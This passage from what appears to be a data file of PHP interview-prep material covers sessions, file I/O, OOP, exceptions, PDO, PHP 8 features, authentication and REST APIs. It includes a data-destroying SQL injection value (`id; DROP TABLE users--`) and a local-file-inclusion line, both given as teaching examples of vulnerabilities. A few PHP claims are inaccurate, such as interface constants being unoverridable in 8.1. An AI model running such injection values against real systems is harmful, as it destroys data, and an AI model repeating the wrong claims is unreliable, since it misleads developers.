          'Session fixation: an attacker sets a known session ID on the victim\'s browser (e.g., via `PHPSESSID` in a URL). When the victim logs in, PHP associates that attacker-controlled session ID with the authenticated user. The attacker, who knows the session ID, can then make requests as the authenticated user. `session_regenerate_id(true)` solves this by assigning a NEW cryptographically random session ID after a successful login, and deleting the old session file. The `true` parameter deletes the old session — without it, the old ID remains valid and the fixation attack still works.',
        follow_up: 'When else besides login should you call `session_regenerate_id()`?',
      },
      {
        question: 'Why do PHP sessions break in a load-balanced environment, and how do you fix it?',
        answer:
          'By default, PHP stores session data as files on the server\'s local filesystem. If you have two servers (Server A and Server B) behind a load balancer and the user\'s first request goes to Server A (creating the session file there), but the second request goes to Server B, Server B has no session file — the user appears logged out. Solutions: (1) Sticky sessions: configure the load balancer to always route the same user to the same server (a crutch, not a real fix). (2) Shared session storage: configure `session.save_handler = redis` so all servers read/write sessions from the same Redis cluster. Redis is the production standard.',
        follow_up: 'What data should you NEVER store in a PHP session?',
      },
    ],
  },

  'File Handling in PHP': {
    explanation:
      'PHP provides streams-based file I/O: `fopen()`, `fread()`, `fwrite()`, `fclose()` for low-level stream access, and convenience functions like `file_get_contents()` and `file_put_contents()` for full-file reads and writes. PHP\'s stream wrappers abstract the transport: `file://` for local files, `https://` for HTTP, `ftp://`, `s3://` (via SDK), `php://input` for raw request body, `php://memory` for in-memory temp buffers. For large files, use stream chunking to avoid loading the entire file into memory.',
    realWorldExample:
      'A CSV import feature: instead of `file_get_contents()` which loads the entire file into memory, open with `fopen($path, "r")` and loop with `fgetcsv($handle, 4096)`. For a 500MB CSV with 5 million rows, the stream approach uses ~4KB of memory per iteration; `file_get_contents()` would exhaust a 256MB `memory_limit` and crash PHP.',
    practicalUseCase:
      'Write a function that tails a log file efficiently: open with `fopen()`, `fseek()` to the end minus 4096 bytes, `fread()` the last chunk, split on newlines, and return the last 20 lines. Wrap it in a CLI script that refreshes every 2 seconds with `sleep()`. This mirrors what `tail -f` does, using only PHP\'s file functions.',
    keyPoints: [
      '`file_get_contents()` loads the entire file into a string — dangerous for files over a few MB on memory-limited servers.',
      'Always `fclose()` file handles — PHP does close them at script end, but explicit closing prevents resource leaks in long-running scripts.',
      'File locking: `flock($handle, LOCK_EX)` for exclusive write lock, `LOCK_SH` for shared read lock — prevents race conditions in concurrent writes.',
      '`file_put_contents($path, $data, LOCK_EX | FILE_APPEND)` is atomic-ish but use `LOCK_EX` for safety on concurrent writes.',
      'Stream contexts: `stream_context_create(["http" => ["timeout" => 5]])` sets timeout on `file_get_contents("https://...")`.',
      'Never use `include`/`require` on user-provided paths — `include $_GET["page"] . ".php"` is a classic local file inclusion (LFI) vulnerability.',
      '`realpath()` resolves `.` and `..` in paths — use it to prevent path traversal: `if (strpos(realpath($path), $basePath) !== 0) die("No");`.',
    ],
    interviewQA: [
      {
        question: 'How do you process a large CSV file in PHP without running out of memory?',
        answer:
          'Stream it row-by-row instead of loading the whole file. Open with `$handle = fopen($csvPath, "r")` and loop with `while (($row = fgetcsv($handle, 4096, ",")) !== false) { processRow($row); }`. Each call to `fgetcsv()` reads one row and PHP can garbage-collect the previous row\'s data. Memory usage stays constant at ~4KB regardless of file size. For extra safety, set a `memory_limit` appropriate for your server and add a row counter to `break` after N rows if processing in chunks across multiple CLI invocations.',
        use_case: 'Importing a 1M-row product catalog: the stream approach completes in ~30 seconds using 8MB RAM; loading with `file_get_contents()` crashes with `Allowed memory size of 134217728 bytes exhausted`.',
        follow_up: 'How would you parallelize processing of a large CSV across multiple PHP CLI workers?',
      },
      {
        question: 'What is a PHP stream wrapper, and name three non-obvious ones?',
        answer:
          'A stream wrapper makes PHP\'s file functions (`fopen`, `file_get_contents`, `fwrite`) work with non-file sources using URI syntax. Three non-obvious ones: (1) `php://input` — the raw HTTP request body, useful in REST APIs to read JSON: `$body = file_get_contents("php://input")`. (2) `php://memory` — an in-memory buffer that behaves like a file handle, great for building large strings or testing without touching disk. (3) `compress.zlib://file.gz` — transparently decompresses gzipped files on read. Custom stream wrappers can be registered with `stream_wrapper_register()` — AWS\'s S3 SDK registers `s3://` this way.',
        follow_up: 'How would you use `php://temp` and what makes it different from `php://memory`?',
      },
    ],
  },

  'Object-Oriented PHP Basics': {
    explanation:
      'PHP\'s object model uses classes with `public`, `protected`, and `private` visibility, single-class inheritance via `extends`, and interfaces/traits for horizontal reuse. Objects are passed and assigned by reference handle — copying an object with `$b = $a` gives both variables access to the same object; use `clone $a` to get an independent copy. PHP 8.0 introduced constructor property promotion (`public function __construct(public readonly string $name) {}`) to eliminate the boilerplate of declaring, then assigning, properties.',
    realWorldExample:
      'A payment service: `class StripeGateway implements PaymentGatewayInterface { public function charge(Money $amount, Card $card): Receipt { ... } }`. The interface `PaymentGatewayInterface` defines the contract. The controller typehints the interface: `function __construct(private PaymentGatewayInterface $gateway) {}`. In tests, you inject a `FakeGateway` that returns a pre-built `Receipt` without hitting Stripe\'s API — this is why interfaces matter more than concrete classes.',
    practicalUseCase:
      'Build a `BankAccount` class with a `private float $balance`, a `deposit(float $amount)` that throws `InvalidArgumentException` for negative amounts, a `withdraw(float $amount)` that throws `InsufficientFundsException` when balance is low, and `getBalance()`. Write a test that asserts both happy path and each exception. This covers encapsulation, invariant enforcement, and custom exceptions.',
    keyPoints: [
      'PHP supports single class inheritance (`extends`) but multiple interface implementation (`implements InterfaceA, InterfaceB`).',
      'Constructor promotion: `__construct(public readonly string $id)` declares, assigns, and sets readonly in one line (PHP 8.0+).',
      '`readonly` properties (PHP 8.1) can only be set once — in the constructor. They cannot be unset or modified after.',
      'Object cloning: `clone $obj` creates a shallow copy — nested objects are still shared. Override `__clone()` for deep copy.',
      '`abstract class` cannot be instantiated; it forces subclasses to implement abstract methods. Use when sharing code between related classes.',
      'Late static binding: `static::class` resolves to the called class at runtime, not the class where the method is defined.',
      'PHP 8.0 added `match`, named arguments, and constructor promotion — PHP 8.1 added enums, readonly properties, and intersection types.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between an abstract class and an interface in PHP?',
        answer:
          'An interface defines a contract — method signatures only, no implementation. A class can implement multiple interfaces. An abstract class can provide partial implementation (concrete methods alongside abstract ones) and can have state (properties with default values). A class can extend only ONE abstract class. Choose interface when you want to define a contract that unrelated classes can satisfy (e.g., `Loggable`, `Serializable`). Choose abstract class when you have shared implementation that all subclasses will use, and the subclasses are logically related (e.g., `AbstractRepository` with a shared `findById()` implementation).',
        use_case: '`Collection` in Laravel is an abstract concept: `Arrayable`, `Countable`, `JsonSerializable` are interfaces the class satisfies; if it extended an abstract class, it couldn\'t also extend `ArrayAccess`.',
        follow_up: 'PHP 8 introduced `interface` constants that implementing classes can\'t override. When would this be useful?',
      },
      {
        question: 'Explain PHP\'s constructor property promotion and when you would avoid it.',
        answer:
          'Constructor property promotion is shorthand: `public function __construct(public string $name, private int $age) {}` automatically declares `$name` as a public property and `$age` as private, and assigns the constructor arguments to them. It eliminates four lines of boilerplate per property (declare, then assign in body). Avoid it when: the property needs complex initialization logic beyond assignment (use the constructor body), you want the declaration separate from the constructor for readability in large classes, or you need to run the assignment through a setter for validation.',
        follow_up: 'Can you mix promoted and non-promoted properties in the same constructor?',
      },
    ],
  },

  'Interfaces, Abstract Classes, and Traits': {
    explanation:
      'Interfaces define behavioral contracts: a list of method signatures that any implementing class must provide. Abstract classes are partially-implemented classes that cannot be instantiated — they mix concrete methods (shared logic) with abstract methods (required overrides). Traits are a horizontal code-reuse mechanism: a collection of methods that any class can `use`, similar to mixins. PHP resolves trait conflicts (two traits with the same method name) via `insteadof` and `as` operators in the `use` block.',
    realWorldExample:
      'A `Notifiable` trait in Laravel adds a `notify(Notification $n)` method to any model that uses it: `class User extends Model { use Notifiable; }`. The User class doesn\'t inherit from any notification-specific parent — it just mixes in the capability. Meanwhile, `ShouldQueue` is an interface that marks a job for async processing — it has no methods; its presence alone signals the queue system. This shows PHP using traits for code sharing and interfaces for capability flags.',
    practicalUseCase:
      'Create a `Timestampable` trait with `private DateTime $createdAt` and `private DateTime $updatedAt`, a `touchTimestamps()` method that sets both, and a `getCreatedAt()` getter. Apply it to `User` and `Product` classes. Then create a `Persistable` interface with `save(): void` and `delete(): void`. Make both classes implement it. Now write a function `function persist(Persistable $entity): void` — it works for both User and Product without a common parent class.',
    keyPoints: [
      'A class can implement unlimited interfaces but extend only one class — this is how PHP compensates for no multiple inheritance.',
      'Traits are not types — you cannot typehint a trait name; use an interface for typehinting and a trait for code reuse.',
      'Trait method conflict resolution: `use TraitA, TraitB { TraitA::method insteadof TraitB; TraitB::method as methodFromB; }`.',
      'Abstract methods in traits force the using class to implement them — a way to define required collaborators.',
      'Interface constants (PHP 8.1) are final by default — implementing classes cannot override them.',
      'Traits can use other traits: `trait A { use B; }` — but this creates tight coupling and makes debugging harder.',
      'PHP checks interface implementation at compile time; missing interface methods cause a fatal error before any code runs.',
    ],
    interviewQA: [
      {
        question: 'When would you use a trait instead of an abstract class?',
        answer:
          'Use a trait when you want to share behavior across classes that have NO logical inheritance relationship. Example: `Timestampable` (add created_at/updated_at) and `SoftDeletable` (add deleted_at, restore()) are capabilities that apply to `User`, `Product`, `Order` — they share no meaningful parent class. An abstract class forces an is-a relationship; a trait adds has-a capabilities without inheritance. The downside of traits: they create hidden dependencies, can\'t be typehinted, and testing becomes harder because the trait methods are invisible to interfaces.',
        follow_up: 'How would you test a method that comes from a trait?',
      },
      {
        question: 'What is an interface with no methods (marker interface) used for in PHP?',
        answer:
          'A marker interface carries semantic meaning through its presence, not through methods. Laravel\'s `ShouldQueue` on jobs signals to the queue dispatcher "this class should run in the background" — the dispatcher checks `$job instanceof ShouldQueue`. PHP\'s `Serializable` marker signals the object can be serialized. Custom example: `interface AdminOnly {}` on controllers — a middleware checks `$controller instanceof AdminOnly` to gate access. This is a clean alternative to checking class names or reading annotations.',
        follow_up: 'What PHP attributes (PHP 8.0) could replace marker interfaces, and would that be better?',
      },
    ],
  },

  'Magic Methods and Late Static Binding': {
    explanation:
      'PHP magic methods are special methods invoked by the engine in response to specific actions, not by name. `__construct` and `__destruct` handle lifecycle. `__get`/`__set`/`__isset`/`__unset` intercept property access on non-existent or inaccessible properties. `__call`/`__callStatic` intercept undefined method calls. `__toString` is called when the object is used in string context. `__invoke` makes the object callable like a function. Late static binding (`static::` vs `self::`) resolves the class reference at call time, not definition time — critical for inheritance-aware factory methods and static caching.',
    realWorldExample:
      'Laravel\'s Eloquent uses `__get` to intercept `$user->posts` — there is no `$posts` property; `__get` is called, which checks if "posts" matches a defined relationship method, calls it, and caches the result as a dynamic property. `__call` handles `User::where("email", $email)` — `where` is not a static method on `User`; `__callStatic` forwards it to a new `Builder` instance. This magic is how Eloquent provides a fluent, chainable query API without generating code per model.',
    practicalUseCase:
      'Build a `FluentConfig` class where `$config->database->host` returns a nested config value using `__get`: each access returns a new `FluentConfig` wrapping the sub-array, allowing dot-notation-style chaining. Implement `__toString` to return the final value as a string. This pattern appears in config libraries and fluent builders.',
    keyPoints: [
      '`__get($name)` is called only when accessing a property that doesn\'t exist or is inaccessible — not for all property access.',
      '`self::` always refers to the class where the method is written; `static::` resolves to the actual class at call time (late static binding).',
      '`__clone()` is called after `clone $obj` — implement it to deep-copy nested objects that would otherwise be shared.',
      '`__invoke()` makes an object callable: `$formatter = new PriceFormatter(); $formatted = $formatter(19.99);`.',
      '`__debugInfo()` controls what `var_dump()` shows — useful to hide sensitive fields like passwords from debug output.',
      'Magic methods add overhead: every undefined property access triggers `__get`. Cache results in a local `$data` array to avoid repeated magic calls.',
      '`__sleep()` and `__wakeup()` control serialization — use them to disconnect database handles before serializing objects.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between `self::` and `static::` in PHP, and why does it matter in inheritance?',
        answer:
          '`self::` is resolved at compile time to the class where the method is written. `static::` is resolved at runtime to the class that was actually called. Example: `class Base { public static function create(): self { return new self(); } }` — if a child class calls `Child::create()`, it still returns a `Base` instance because `self` is hardcoded. With `static::`: `return new static()` — calling `Child::create()` returns a `Child` instance. This is essential for any factory or singleton pattern in an inheritance hierarchy.',
        use_case: 'Eloquent\'s `Model::create()` uses `static::` so `User::create($data)` returns a `User` instance, not a generic `Model`.',
        follow_up: 'How does late static binding interact with the `__construct` method?',
      },
      {
        question: 'What does `__call` do, and what is a real-world use case for it?',
        answer:
          '`__call($name, $args)` is invoked when you call an undefined or inaccessible method on an object. It receives the method name as a string and arguments as an array. Real-world uses: (1) Laravel Query Builder — `$query->whereEmail($email)` triggers `__call("whereEmail", ["email@example.com"])`, which parses the method name and builds a WHERE clause. (2) Mocking libraries — PHPUnit Mockery intercepts all method calls via `__call` to record expectations. (3) Fluent APIs — `$builder->bold()->italic()->color("red")` implemented with `__call` that returns `$this` after applying each style.',
        follow_up: 'What is the performance cost of `__call` vs a defined method, and when does it matter?',
      },
    ],
  },

  'Error Handling and Exceptions': {
    explanation:
      'PHP 7+ unified error handling: most fatal and catchable errors now throw `Error` exceptions (a sibling of `Exception`, both implementing `Throwable`). This means you can catch PHP engine errors (type errors, division by zero, undefined function calls) with `try/catch`. The exception hierarchy: `Throwable` → `Error` (engine errors) / `Exception` (application errors) → specific subtypes. `set_error_handler()` catches legacy E_WARNING/E_NOTICE errors that still don\'t throw. `set_exception_handler()` catches uncaught exceptions. Never silence errors with `@` operator — it hides bugs.',
    realWorldExample:
      'A payment processor wraps Stripe SDK calls: `try { $charge = Stripe::charge($amount, $card); } catch (\\Stripe\\Exception\\CardException $e) { // Handle declined card — expected, user-facing error } catch (\\Stripe\\Exception\\ApiConnectionException $e) { // Stripe is down — retry with exponential backoff } catch (\\Throwable $e) { // Unknown error — log, alert engineering $this->logger->critical("Stripe unknown error", ["error" => $e->getMessage()]); throw $e; // Re-throw — don\'t swallow }`. Each exception type has a different response strategy.',
    practicalUseCase:
      'Create a custom exception hierarchy: `AppException extends RuntimeException`, then `ValidationException extends AppException` with a `getErrors(): array` method, and `NotFoundException extends AppException`. Write a global exception handler in a framework bootstrap that catches `ValidationException` and returns a 422 JSON response, `NotFoundException` returns 404, and anything else returns 500 with error ID for support lookup. This is the pattern Laravel\'s `Handler.php` uses.',
    keyPoints: [
      'PHP 7+ `Throwable` is the base interface for both `Error` and `Exception` — catch `Throwable` only when you genuinely handle all errors.',
      'Never use empty `catch {}` blocks — at minimum log the exception; otherwise you are hiding bugs permanently.',
      'Custom exceptions should extend the most specific built-in type: `InvalidArgumentException`, `RuntimeException`, `LogicException`.',
      '`finally` block executes whether or not an exception is thrown — use it to release resources (close DB connections, unlock files).',
      'Exception chaining: `throw new AppException("User save failed", 0, $e)` preserves the original exception as `getPrevious()`.',
      'PHP\'s `@` error suppression operator is a code smell — it hides bugs and makes debugging nearly impossible.',
      'In production, set `display_errors = Off` and always log to a file or service (Sentry, Bugsnag) — never show stack traces to users.',
    ],
    interviewQA: [
      {
        question: 'What is the difference between `Error` and `Exception` in PHP 7+?',
        answer:
          '`Exception` is for application-level recoverable errors: business logic failures, validation errors, API errors. `Error` is for PHP engine-level errors: `TypeError` (wrong argument type), `ParseError` (syntax error at eval time), `DivisionByZeroError`, `ArithmeticError`. Both implement `Throwable`. You can catch both with `catch (\\Throwable $e)`, but this is too broad for application code. In libraries, catch the most specific type. In top-level handlers, catch `Throwable` to ensure nothing escapes unlogged. The practical difference: you won\'t create subclasses of `Error` — you create subclasses of `Exception` for your application\'s domain errors.',
        follow_up: 'When should you catch `Throwable` vs `Exception`?',
      },
      {
        question: 'How does PHP\'s `finally` block interact with `return` statements?',
        answer:
          'The `finally` block always executes, even when the `try` or `catch` block contains a `return`. If `finally` contains a `return`, it OVERRIDES the return value from `try`/`catch`. This is a common gotcha: `try { return "from try"; } finally { return "from finally"; }` returns "from finally" — the try\'s return is discarded. Use `finally` strictly for cleanup (closing handles, releasing locks), never for returning values, to avoid this surprising behavior.',
        follow_up: 'What happens to a `return` inside `try` when `finally` throws an exception?',
      },
    ],
  },

  'PDO and Database Access': {
    explanation:
      'PDO (PHP Data Objects) is a database abstraction layer that provides a consistent API across MySQL, PostgreSQL, SQLite, and others. The critical feature is prepared statements: `$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?"); $stmt->execute([$email])` — the SQL is sent to the database engine first (parsed, compiled), then the parameters are bound separately as data, making SQL injection structurally impossible for bound parameters. PDO also provides transaction support, fetch modes, and named placeholders.',
    realWorldExample:
      'A user search endpoint: `$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE role = :role AND active = 1 ORDER BY name LIMIT :limit OFFSET :offset"); $stmt->bindValue(":role", $role, PDO::PARAM_STR); $stmt->bindValue(":limit", $perPage, PDO::PARAM_INT); $stmt->bindValue(":offset", $offset, PDO::PARAM_INT); $stmt->execute(); $users = $stmt->fetchAll(PDO::FETCH_ASSOC)`. Named placeholders make the intent clear; `bindValue` with type constants prevents type-casting bugs on LIMIT/OFFSET integers.',
    practicalUseCase:
      'Build a `Database` wrapper class with a `query(string $sql, array $params = []): array` method that prepares, executes, and returns results. Add a `transaction(callable $fn): void` method that calls `$pdo->beginTransaction()`, runs `$fn($this)`, then commits — and rolls back in `catch`. Test it by transferring balance between two accounts: the debit and credit must both succeed or both fail.',
    keyPoints: [
      'Prepared statements prevent SQL injection by separating SQL structure from data — the DB engine never interprets parameter values as SQL.',
      'Named placeholders (`:name`) are clearer than positional `?` for queries with many parameters.',
      '`bindValue()` binds a VALUE; `bindParam()` binds a VARIABLE by reference — evaluated at `execute()` time, not at `bind()` time.',
      '`PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION` makes PDO throw `PDOException` on errors instead of silently returning false.',
      '`PDO::ATTR_EMULATE_PREPARES => false` disables emulated prepares — use real server-side prepared statements for true injection protection.',
      'Transaction isolation: `$pdo->beginTransaction()` / `$pdo->commit()` / `$pdo->rollBack()` — always rollback in catch blocks.',
      '`fetchAll(PDO::FETCH_CLASS, User::class)` maps rows directly to PHP objects without manual hydration.',
    ],
    interviewQA: [
      {
        question: 'Why doesn\'t a PDO prepared statement fully prevent SQL injection in all cases?',
        answer:
          'Prepared statements protect bound parameters — column values passed as data. They do NOT protect dynamic SQL structure: column names, table names, ORDER BY column, or LIMIT/OFFSET when you build them from user input without binding. Example: `$col = $_GET["sort"]; $stmt = $pdo->query("SELECT * FROM users ORDER BY $col")` — `$col = "id; DROP TABLE users--"` is a SQL injection. Fix: whitelist allowed columns with `if (!in_array($col, ["name", "email", "created_at"])) throw new Exception("Invalid sort")`. Structure must be whitelisted; only VALUES can be bound.',
        use_case: 'A dynamic filter API that allows sorting by user-chosen column must whitelist those column names against the actual schema — never put `$_GET["sort"]` directly into a query string.',
        follow_up: 'How would you build a safe dynamic query builder that allows arbitrary column filtering?',
      },
      {
        question: 'What is the difference between `PDOStatement::bindValue()` and `bindParam()`?',
        answer:
          '`bindValue($param, $value, $type)` binds a specific value at the time of the call — the value is captured immediately. `bindParam($param, &$variable, $type)` binds a variable by reference — the variable\'s value is read at `execute()` time, not at `bindParam()` time. In a loop where you reuse the same `$stmt` with different values: use `bindParam` and change the variable before each `execute()`— the statement reads the updated variable each time. Use `bindValue` when you\'re passing a literal or a calculated value that won\'t change before execution.',
        follow_up: 'When would `PDO::PARAM_INT` matter vs letting PDO auto-detect the type?',
      },
    ],
  },

  'PHP 8 Features': {
    explanation:
      'PHP 8.0–8.3 introduced the most significant language improvements in PHP\'s history. 8.0: JIT compiler, named arguments, `match` expression, nullsafe operator `?->`, union types, attributes (replacing docblock annotations), constructor property promotion, `str_contains()`/`str_starts_with()`/`str_ends_with()`. 8.1: enums, readonly properties, fibers (cooperative multitasking), intersection types, `never` return type, array unpacking with string keys. 8.2: readonly classes, disjunctive normal form types, `true`/`false`/`null` as standalone types. 8.3: typed class constants, `json_validate()`, `#[Override]` attribute.',
    realWorldExample:
      'Before PHP 8: `function getUser(?int $id): ?array { if ($id === null) return null; $user = $this->repo->find($id); if (!$user) return null; $addr = $user["address"]; if (!$addr) return null; return $addr["city"]; }`. After PHP 8: `fn(?int $id) => $this->repo->find($id)?->address?->city`. The nullsafe operator eliminates four if-null checks. Named arguments: `array_slice(array: $users, offset: 10, length: 5)` — clearer than positional args, and you can skip optional params by name.',
    practicalUseCase:
      'Refactor a `Status` class with constants (`const ACTIVE = "active"`, `const BANNED = "banned"`) into a PHP 8.1 backed enum: `enum Status: string { case Active = "active"; case Banned = "banned"; case Pending = "pending"; }`. Use `Status::from("active")` to parse, `Status::tryFrom("unknown")` to safely parse, and `$status->label()` via an interface method. Add `Status::cases()` to list all values — replaces manual constant arrays.',
    keyPoints: [
      'Named arguments skip optional parameters: `htmlspecialchars($s, double_encode: false)` — only the relevant argument named.',
      'PHP 8.1 enums are objects, not constants — they have methods, implement interfaces, and cannot be compared with `==` to strings directly.',
      'Fibers (PHP 8.1) enable cooperative multitasking — the foundation for async frameworks like ReactPHP and Amp.',
      'Readonly properties can only be initialized once (in the constructor) and cannot be modified after — enforced by the engine.',
      '`str_contains("Hello World", "World")` replaces `strpos() !== false` — clearer and handles empty string correctly.',
      'JIT compiles hot code paths to native machine code — gives 2-3× speedup for CPU-heavy work, minimal benefit for typical DB-bound web apps.',
      '`#[Override]` attribute (PHP 8.3) causes a compile error if the method doesn\'t actually override a parent method — catches typos in override chains.',
    ],
    interviewQA: [
      {
        question: 'What are PHP 8.1 enums and how do they differ from class constants?',
        answer:
          'PHP 8.1 enums are first-class types, not just named constants. A backed enum (`enum Status: string`) maps each case to a specific scalar value; a pure enum has no backing value. Key differences from constants: (1) Enums are types — you can typehint `Status $status`; constants have no type. (2) Enum cases are singletons — `Status::Active === Status::Active` is always true. (3) Enums can implement interfaces and have methods. (4) `Status::from("active")` parses a string to an enum case; `Status::tryFrom("unknown")` returns null instead of throwing. (5) `Status::cases()` returns an array of all cases — replaces manual constant-to-array mappings.',
        use_case: 'A database column stores `"active"`, `"banned"`, `"pending"`. With backed enums: `$status = Status::from($row["status"])` — if an unknown value arrives, it throws `ValueError` immediately rather than silently passing an invalid string through your system.',
        follow_up: 'Can a PHP enum extend another enum or class?',
      },
      {
        question: 'When does PHP 8\'s JIT actually improve performance, and when does it not?',
        answer:
          'JIT (Just-In-Time) compiles frequently-executed PHP opcodes to native machine code at runtime. It helps significantly for CPU-bound operations: math computations, string processing, image manipulation, machine learning inference in pure PHP. It does NOT help for I/O-bound web applications — if your script spends 90% of time waiting for MySQL, Redis, or filesystem responses, compiling the PHP opcodes won\'t reduce that wait. Benchmarks show 2–3× improvement for CPU-heavy tasks, and 0–5% improvement for typical CRUD web apps. OPcache\'s bytecode caching remains the more impactful optimization for web workloads.',
        follow_up: 'What PHP configuration settings enable JIT, and what\'s the difference between `tracing` and `function` JIT modes?',
      },
    ],
  },

  'Authentication and Authorization': {
    explanation:
      'Authentication verifies identity ("who are you?"); authorization verifies permissions ("what can you do?"). In PHP, authentication typically involves: hashing passwords with `password_hash($plain, PASSWORD_BCRYPT)` on registration, verifying with `password_verify($input, $hash)` on login, and storing only the `user_id` in a session after successful verification. Authorization is then enforcing role/permission checks before performing actions. Never store plaintext passwords, MD5, or SHA1 hashes — only bcrypt, Argon2i, or Argon2id. `PASSWORD_DEFAULT` in PHP maps to bcrypt and will automatically upgrade as better algorithms become PHP\'s default.',
    realWorldExample:
      'A multi-tenant SaaS app: authentication confirms the user\'s identity via email + bcrypt. Authorization is more complex: `User::find($id)->can("delete-post", $post)` checks if the authenticated user owns the post or is an admin. The `can()` check hits a permissions table joined to roles. A middleware runs on every request: authenticates via session → loads permissions → attaches to request context. Admin pages additionally check `role === "admin"` before rendering the view.',
    practicalUseCase:
      'Build a minimal auth system: register stores `password_hash($password, PASSWORD_ARGON2ID)`, login uses `password_verify()` + `session_regenerate_id(true)`, a `requireAuth()` middleware redirects unauthenticated requests to `/login`, and a `requireRole("admin")` function checks `$_SESSION["role"]`. Test: confirm that visiting `/admin` without a session redirects, and visiting it as a non-admin returns 403.',
    keyPoints: [
      '`password_hash($plain, PASSWORD_ARGON2ID)` — Argon2id is the current gold standard; bcrypt is still acceptable.',
      '`password_needs_rehash($hash, PASSWORD_ARGON2ID)` checks if a stored hash needs upgrading — call it after successful login.',
      'Never compare password hashes with `===` — use `password_verify()` which is timing-safe by design.',
      'Session fixation: always `session_regenerate_id(true)` after login to prevent attackers from pre-setting a known session ID.',
      'JWT for stateless APIs: verify signature with `openssl_verify()` or a library like `firebase/php-jwt`; never `base64_decode` and trust without verification.',
      'Rate limit login attempts: track failed attempts in Redis with a TTL; lock account after 5 failures for 15 minutes.',
      'Refresh tokens should be rotated on each use and stored as a bcrypt hash in the database — if a refresh token is stolen, rotation exposes the theft.',
    ],
    interviewQA: [
      {
        question: 'Why is bcrypt better than SHA-256 for storing passwords?',
        answer:
          'SHA-256 is a fast hashing algorithm designed for speed — a modern GPU can compute 10 billion SHA-256 hashes per second, making brute-force attacks trivial. Bcrypt is intentionally slow: it uses a cost factor that makes each hash take ~100ms. The same GPU that computes 10B SHA-256 hashes/second computes only ~20K bcrypt hashes/second. Additionally, bcrypt automatically salts each password (the salt is embedded in the output hash), preventing rainbow table attacks. The cost factor is adjustable — as hardware gets faster, you increase the cost to keep the time constant at ~100ms.',
        use_case: 'A database breach leaks 1M bcrypt hashes. At 20K attempts/second, cracking a 10-character password takes years. The same breach with SHA-256 hashes: cracked in minutes with a GPU cluster.',
        follow_up: 'What is Argon2id, and why might you choose it over bcrypt for new systems?',
      },
      {
        question: 'How would you implement "remember me" functionality securely in PHP?',
        answer:
          'Generate a 256-bit random token: `$token = bin2hex(random_bytes(32))`. Store its bcrypt hash in a `remember_tokens` table with columns `user_id`, `token_hash`, `expires_at`. Set a cookie: `setcookie("remember", $token, ["expires" => time()+30*86400, "secure" => true, "httponly" => true, "samesite" => "Lax"])`. On subsequent requests: read the cookie, look up the hash in the database (`password_verify()`), if found and not expired, log the user in and ROTATE the token (generate new, update DB, set new cookie). Rotation detects token theft: if an attacker uses a stolen token first, the legitimate user\'s next request finds no match.',
        follow_up: 'What is a "split token" approach for remember-me tokens, and what additional attack does it prevent?',
      },
    ],
  },

  'REST API Development': {
    explanation:
      'A PHP REST API maps HTTP methods (GET, POST, PUT/PATCH, DELETE) to CRUD operations, returns JSON, and uses HTTP status codes semantically. PHP reads the request method from `$_SERVER["REQUEST_METHOD"]`, reads JSON body from `file_get_contents("php://input")` (decoded with `json_decode`), and sends responses with `header("Content-Type: application/json")` and `echo json_encode($data)`. In frameworks like Laravel or Slim, routing, middleware, and request/response abstractions handle these details. RESTful design: resources are nouns (`/users/42`), HTTP verbs are the actions, status codes communicate results (200, 201, 400, 401, 403, 404, 422, 500).',
    realWorldExample:
      'A `PATCH /api/users/42` endpoint: Laravel validates `["name" => "required|string|max:100", "email" => "email|unique:users,email,42"]` using Form Request. If validation fails, Laravel automatically returns 422 with error details. On success, `User::findOrFail(42)` (404 if not found) → `$user->update($validated)` → `return new UserResource($user)` with 200. The resource class transforms the Eloquent model to JSON, hiding internal fields like `password` and formatting `created_at`.',
    practicalUseCase:
      'Build a pure-PHP (no framework) REST API for a `tasks` resource. Use `match($_SERVER["REQUEST_METHOD"])` to route GET/POST/PUT/DELETE. Read JSON body with `json_decode(file_get_contents("php://input"), true)`. Use PDO with prepared statements for DB access. Set proper status codes: 201 on create, 204 on delete (no body), 404 when not found, 422 for validation errors. Test with `curl -X POST -H "Content-Type: application/json" -d "{\"title\":\"Buy milk\"}" localhost:8000/tasks`.',
    keyPoints: [
      'HTTP semantics: GET is idempotent (safe), POST creates, PUT replaces the full resource, PATCH updates partially, DELETE removes.',
      '`json_decode($body, true)` returns an associative array; without `true`, it returns `stdClass` objects.',
      'Always validate Content-Type header for POST/PUT/PATCH: `$_SERVER["CONTENT_TYPE"] === "application/json"`.',
      'API versioning: prefix routes with `/v1/`, `/v2/` or use Accept header versioning: `Accept: application/vnd.api+json;version=2`.',
      'Return consistent error envelopes: `{"error": "Not found", "code": "USER_NOT_FOUND", "request_id": "abc123"}` for debuggable responses.',
      'CORS headers for browser clients: `header("Access-Control-Allow-Origin: https://yourfrontend.com")` — never `*` for authenticated APIs.',
      'Rate limiting: return `X-RateLimit-Remaining` and `Retry-After` headers; respond with 429 Too Many Requests when exceeded.',
    ],
    interviewQA: [
      {
        question: 'What HTTP status codes should a REST API return and when?',
        answer:
          '200 OK for successful GET/PUT/PATCH. 201 Created for successful POST that creates a resource; include `Location: /users/42` header. 204 No Content for successful DELETE or PUT with no response body. 400 Bad Request for malformed request syntax. 401 Unauthorized when authentication is required but missing/invalid. 403 Forbidden when the user is authenticated but lacks permission. 404 Not Found when the resource doesn\'t exist. 422 Unprocessable Entity for validation failures (the request is well-formed but semantically invalid). 429 Too Many Requests for rate limiting. 500 Internal Server Error for unexpected server failures — never expose stack traces in the body.',
        follow_up: 'What is the semantic difference between 401 and 403, and why does it matter for API security?',
      },
      {
        question: 'How would you handle API authentication — session vs JWT vs API key?',
        answer:
          'API keys: static strings stored as bcrypt hash in DB, sent in `Authorization: Bearer sk_live_abc123` header — ideal for server-to-server, machine clients. JWT: stateless tokens with claims signed by your private key — ideal for microservices where you don\'t want a DB lookup per request, but revocation is hard (you must maintain a blocklist). Sessions: cookie-based, server-side state — ideal for browser-based SPAs on the same domain, built-in CSRF protection with `SameSite`. For public APIs, API keys are operationally simple. For user-facing SPAs, cookie sessions with CSRF tokens are the most battle-tested. JWT is appropriate when cross-domain or cross-service authentication is required.',
        follow_up: 'How do you revoke a JWT before its expiry time?',
      },
    ],
  },

  'Design Patterns in PHP': {
    explanation:
